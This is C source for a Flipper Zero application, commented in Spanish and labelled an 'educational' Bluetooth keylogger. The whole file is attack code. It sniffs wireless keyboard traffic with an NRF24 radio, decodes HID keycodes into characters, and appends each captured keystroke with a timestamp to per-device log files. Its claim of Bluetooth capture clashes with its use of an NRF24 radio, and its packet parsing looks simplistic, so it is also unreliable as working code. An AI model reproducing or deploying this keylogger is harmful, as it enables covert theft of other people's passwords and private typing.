/**
 * Bluetooth Keylogger para Flipper Zero (Firmware Xtreme)
 * Captura pulsaciones de teclados Bluetooth Logitech usando NRF24
 * 
 * Uso: Solo para fines educativos
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/popup.h>
#include <storage/storage.h>
#include <notification/notification_messages.h>

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "nrf24_driver.h"

#define APP_NAME "BT Sniffer"
#define LOG_DIR EXT_PATH("logs")
#define MAX_DEVICES 20
#define MAC_STR_LEN 18

typedef enum {
    ViewMenu = 0,
    ViewSniffing,
    ViewDeviceList,
} AppView;

typedef struct {
    uint8_t mac[6];
    char mac_str[MAC_STR_LEN];
    bool selected;
    uint32_t key_count;
    uint32_t last_seen;
} Device;

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* menu;
    Submenu* device_list;
    Popup* popup;
    NotificationApp* notifications;
    
    Device devices[MAX_DEVICES];
    uint8_t device_count;
    int8_t selected_idx;
    
    bool running;
    bool sniffing;
    bool scan_all;
    
    FuriThread* worker;
    FuriMutex* mutex;
} App;

static void mac_to_str(uint8_t* mac, char* str) {
    snprintf(str, MAC_STR_LEN, "%02X%02X%02X%02X%02X%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void mac_to_str_fmt(uint8_t* mac, char* str) {
    snprintf(str, MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static const char* hid_to_char(uint8_t code, bool shift) {
    static char buf[16];
    
    if(code >= 0x04 && code <= 0x1D) {
        buf[0] = shift ? ('A' + code - 0x04) : ('a' + code - 0x04);
        buf[1] = 0;
        return buf;
    }
    
    if(code >= 0x1E && code <= 0x27) {
        const char* nums = "1234567890";
        const char* syms = "!@#$%^&*()";
        buf[0] = shift ? syms[code - 0x1E] : nums[code - 0x1E];
        buf[1] = 0;
        return buf;
    }
    
    switch(code) {
        case 0x28: return "[ENTER]\n";
        case 0x29: return "[ESC]";
        case 0x2A: return "[BS]";
        case 0x2B: return "[TAB]";
        case 0x2C: return shift ? "_" : " ";
        case 0x2D: return shift ? "+" : "-";
        case 0x2E: return shift ? "{" : "[";
        case 0x2F: return shift ? "}" : "]";
        case 0x30: return shift ? "|" : "\\";
        case 0x33: return shift ? ":" : ";";
        case 0x34: return shift ? "\"" : "'";
        case 0x36: return shift ? "<" : ",";
        case 0x37: return shift ? ">" : ".";
        case 0x38: return shift ? "?" : "/";
        default: return "";
    }
}

static Device* find_device(App* app, uint8_t* mac) {
    for(uint8_t i = 0; i < app->device_count; i++) {
        if(memcmp(app->devices[i].mac, mac, 6) == 0) {
            return &app->devices[i];
        }
    }
    return NULL;
}

static Device* add_device(App* app, uint8_t* mac) {
    if(app->device_count >= MAX_DEVICES) return NULL;
    
    Device* dev = &app->devices[app->device_count];
    memcpy(dev->mac, mac, 6);
    mac_to_str_fmt(mac, dev->mac_str);
    dev->selected = false;
    dev->key_count = 0;
    dev->last_seen = furi_get_tick();
    app->device_count++;
    
    return dev;
}

static Device* get_or_add_device(App* app, uint8_t* mac) {
    Device* dev = find_device(app, mac);
    if(!dev) {
        furi_mutex_acquire(app->mutex, FuriWaitForever);
        dev = add_device(app, mac);
        furi_mutex_release(app->mutex);
    }
    if(dev) dev->last_seen = furi_get_tick();
    return dev;
}

static void save_key(Device* dev, const char* key) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_simply_mkdir(storage, LOG_DIR);
    
    char path[128];
    char mac_fn[16];
    mac_to_str(dev->mac, mac_fn);
    snprintf(path, sizeof(path), "%s/%s.txt", LOG_DIR, mac_fn);
    
    File* file = storage_file_alloc(storage);
    if(storage_file_open(file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        FuriHalRtcDateTime dt;
        furi_hal_rtc_get_datetime(&dt);
        
        char line[64];
        int len = snprintf(line, sizeof(line), "[%02d:%02d:%02d] %s",
            dt.hour, dt.minute, dt.second, key);
        storage_file_write(file, line, len);
    }
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

static void process_packet(App* app, uint8_t* data, uint8_t len) {
    if(len < 8) return;
    if(data[1] > 1) return;
    
    uint8_t mac[6];
    memcpy(mac, data, 6);
    
    bool has_key = false;
    for(int i = 2; i < 8 && i < len; i++) {
        if(data[i] >= 0x04 && data[i] <= 0x38) {
            has_key = true;
            break;
        }
    }
    if(!has_key) return;
    
    Device* dev = get_or_add_device(app, mac);
    if(!dev) return;
    
    if(!app->scan_all && !dev->selected) return;
    
    bool shift = (data[0] & 0x22) != 0;
    for(int i = 2; i < 8 && i < len; i++) {
        if(data[i] == 0) continue;
        
        const char* key = hid_to_char(data[i], shift);
        if(key[0]) {
            save_key(dev, key);
            dev->key_count++;
        }
    }
}

static int32_t worker_thread(void* ctx) {
    App* app = ctx;
    
    if(!nrf24_init()) {
        FURI_LOG_E("BT", "NRF24 init failed");
        return -1;
    }
    
    uint8_t buf[32];
    uint8_t len;
    uint8_t pipe;
    
    while(app->running && app->sniffing) {
        if(nrf24_available()) {
            if(nrf24_read(buf, &len, &pipe)) {
                furi_mutex_acquire(app->mutex, 50);
                process_packet(app, buf, len);
                furi_mutex_release(app->mutex);
            }
        }
        furi_delay_ms(5);
    }
    
    nrf24_deinit();
    return 0;
}

static void menu_callback(void* ctx, uint32_t idx);

static void update_device_list(App* app) {
    submenu_reset(app->device_list);
    for(uint8_t i = 0; i < app->device_count; i++) {
        char item[48];
        snprintf(item, sizeof(item), "%s%s (%lu)", 
            app->devices[i].selected ? "[*] " : "",
            app->devices[i].mac_str,
            app->devices[i].key_count);
        submenu_add_item(app->device_list, item, i + 10, menu_callback, app);
    }
    if(app->device_count == 0) {
        submenu_add_item(app->device_list, "Sin dispositivos", 100, NULL, NULL);
    }
}

static void start_sniffing(App* app) {
    if(app->sniffing) return;
    
    app->sniffing = true;
    app->running = true;
    
    app->worker = furi_thread_alloc();
    furi_thread_set_name(app->worker, "BTWorker");
    furi_thread_set_stack_size(app->worker, 2048);
    furi_thread_set_callback(app->worker, worker_thread);
    furi_thread_set_context(app->worker, app);
    furi_thread_start(app->worker);
}

static void menu_callback(void* ctx, uint32_t idx) {
    App* app = ctx;
    
    if(idx == 0) {
        app->scan_all = true;
        start_sniffing(app);
        notification_message(app->notifications, &sequence_blink_start_blue);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewSniffing);
    }
    else if(idx == 1) {
        update_device_list(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewDeviceList);
    }
    else if(idx == 2) {
        app->sniffing = false;
        notification_message(app->notifications, &sequence_blink_stop);
    }
    else if(idx >= 10 && idx < 10 + MAX_DEVICES) {
        uint8_t dev_idx = idx - 10;
        if(dev_idx < app->device_count) {
            app->devices[dev_idx].selected = !app->devices[dev_idx].selected;
            app->scan_all = false;
            start_sniffing(app);
            update_device_list(app);
            notification_message(app->notifications, &sequence_single_vibro);
        }
    }
}

static bool nav_callback(void* ctx) {
    App* app = ctx;
    uint32_t view = view_dispatcher_get_current_view(app->view_dispatcher);
    
    if(view == ViewMenu) {
        return false;
    }
    
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    return true;
}

static App* app_alloc() {
    App* app = malloc(sizeof(App));
    memset(app, 0, sizeof(App));
    
    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, nav_callback);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    
    app->menu = submenu_alloc();
    submenu_add_item(app->menu, "Escanear todos", 0, menu_callback, app);
    submenu_add_item(app->menu, "Dispositivos", 1, menu_callback, app);
    submenu_add_item(app->menu, "Detener", 2, menu_callback, app);
    view_dispatcher_add_view(app->view_dispatcher, ViewMenu, submenu_get_view(app->menu));
    
    app->popup = popup_alloc();
    popup_set_header(app->popup, "Sniffing...", 64, 20, AlignCenter, AlignBottom);
    popup_set_text(app->popup, "Capturando teclados BT\nBACK para volver", 64, 32, AlignCenter, AlignTop);
    view_dispatcher_add_view(app->view_dispatcher, ViewSniffing, popup_get_view(app->popup));
    
    app->device_list = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, ViewDeviceList, submenu_get_view(app->device_list));
    
    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_simply_mkdir(storage, LOG_DIR);
    furi_record_close(RECORD_STORAGE);
    
    return app;
}

static void app_free(App* app) {
    app->running = false;
    app->sniffing = false;
    
    if(app->worker) {
        furi_thread_join(app->worker);
        furi_thread_free(app->worker);
    }
    
    view_dispatcher_remove_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewSniffing);
    view_dispatcher_remove_view(app->view_dispatcher, ViewDeviceList);
    
    submenu_free(app->menu);
    submenu_free(app->device_list);
    popup_free(app->popup);
    view_dispatcher_free(app->view_dispatcher);
    
    furi_mutex_free(app->mutex);
    
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);
    
    free(app);
}

int32_t bt_keylogger_app(void* p) {
    UNUSED(p);
    
    App* app = app_alloc();
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_run(app->view_dispatcher);
    app_free(app);
    
    return 0;
}
